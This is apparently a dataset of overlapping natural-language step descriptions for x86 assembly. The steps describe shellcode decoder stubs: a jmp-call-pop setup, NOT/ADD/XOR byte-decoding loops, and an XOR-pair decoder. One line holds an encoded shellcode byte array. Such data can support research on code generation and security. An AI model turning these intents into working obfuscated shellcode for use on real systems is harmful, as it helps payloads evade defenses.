jump to decode if eax is not zero _BREAK define execute_shelloce _BREAK jump short to esp
define execute_shelloce _BREAK jump short to esp_ BREAK define call_shellcode
jump short to esp_ BREAK define call_shellcode _BREAK execute the decoder routine
define call_shellcode _BREAK execute the decoder routine _BREAK encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa
jump short to call_shellcode _BREAK decoder_setup label _BREAK pop shellcode into esi
decoder_setup label _BREAK pop shellcode into esi _BREAK decode function
pop shellcode into esi _BREAK decode function _BREAK compare current esi byte with 0x88
decode function _BREAK compare current esi byte with 0x88 _BREAK jump to shellcode label if byte in esi is zero
compare current esi byte with 0x88 _BREAK jump to shellcode label if byte in esi is zero _BREAK NOT operation of current byte in esi
jump to shellcode label if byte in esi is zero _BREAK NOT operation of current byte in esi _BREAK ADD 0x02 to the current byte in esi
NOT operation of current byte in esi _BREAK ADD 0x02 to the current byte in esi _BREAK XOR between current byte in esi and 0x97
ADD 0x02 to the current byte in esi _BREAK XOR between current byte in esi and 0x97 _BREAK ADD 0x10 to the current byte in esi
XOR between current byte in esi and 0x97 _BREAK ADD 0x10 to the current byte in esi _BREAK XOR between the current byte in esi and 0x88
ADD 0x10 to the current byte in esi _BREAK XOR between the current byte in esi and 0x88 _BREAK move to next byte in esi
XOR between the current byte in esi and 0x88 _BREAK move to next byte in esi _BREAK jump back to start of decode
move to next byte in esi _BREAK jump back to start of decode _BREAK call_shellcode function
jump back to start of decode _BREAK call_shellcode function _BREAK call decoder_setup
store the encoded shellcode pointer in the esi register _BREAK zero out the ecx register _BREAK move 23 into the cl
zero out the ecx register _BREAK move 23 into the cl _BREAK zero out the ebx register
move 23 into the cl _BREAK zero out the ebx register _BREAK move the next byte of the shellcode into bl
zero out the ebx register _BREAK move the next byte of the shellcode into bl _BREAK clear the edx register
move the next byte of the shellcode into bl _BREAK clear the edx register _BREAK move the current byte of the shellcode into dl
clear the edx register _BREAK move the current byte of the shellcode into dl _BREAK perform the xor between the next byte of the shellcode and the dl register
move the current byte of the shellcode into dl _BREAK perform the xor between the next byte of the shellcode and the dl register _BREAK move the contents of the address esi+1 into dl
perform the xor between the next byte of the shellcode and the dl register _BREAK move the contents of the address esi+1 into dl _BREAK perform the xor between the current byte of the shellcode and the dl register
move the contents of the address esi+1 into dl _BREAK perform the xor between the current byte of the shellcode and the dl register _BREAK load the effective address of esi+2 into esi
perform the xor between the current byte of the shellcode and the dl register _BREAK load the effective address of esi+2 into esi _BREAK move the address of esi-1 into dl